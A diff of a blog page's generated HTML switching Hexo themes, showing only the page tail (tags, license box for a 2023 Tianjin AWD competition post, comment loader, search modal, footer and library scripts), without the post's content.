-    if (typeof twikoo === 'object') {
-      setTimeout(runFn,0)
-      return
-    } 
-    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
-  }
+      </span>
+    
+  
+</span>
 
-  if ('Twikoo' === 'Twikoo' || !false) {
-    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
-    else loadTwikoo()
-  } else {
-    window.loadOtherComment = () => {
-      loadTwikoo()
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/rce/" class="print-no-link">#rce</a>
+      
+        <a href="/tags/php/" class="print-no-link">#php</a>
+      
+        <a href="/tags/awd/" class="print-no-link">#awd</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>天津市大学生信息安全网络攻防大赛</div>
+      <div>https://blog.lazyforever.top/2023/09/19/2023tianjindawd/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lazy_forever</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/26/2023newstarctfWeek1/" title="NewStarCTF 2023-WEEK1 WriteUp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">NewStarCTF 2023-WEEK1 WriteUp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/27/2023dasctf_MyPicDisk/" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk">
+                        <span class="hidden-mobile">[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo.lazyforever.top/","region":null,"path":null},
+          {
+            el: '#twikoo',
+            path: '',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         次
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
     }
-  }
-})()</script></div><div class="aplayer no-destroy" data-id="7459592653" data-server="tencent" data-type="playlist"   data-order="random" data-fixed="true" data-preload="auto" data-autoplay="true" data-mutex="true" ></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="30px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
